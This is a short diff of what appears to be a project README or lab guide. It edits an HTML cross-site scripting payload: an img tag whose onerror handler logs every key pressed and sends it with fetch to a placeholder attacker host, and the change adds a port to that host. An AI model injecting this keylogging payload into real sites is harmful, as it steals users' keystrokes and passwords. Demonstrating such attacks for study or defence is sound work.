@@ -55,7 +55,7 @@ npm run dev
 ```html
 <img src=x onerror="
   document.addEventListener('keyup', (ev) => {
-    fetch(`http://<hostname>/?key=${ev.key}`);
+    fetch(`http://<hostname>:<port>/?key=${ev.key}`);
   });
 " />
 ```
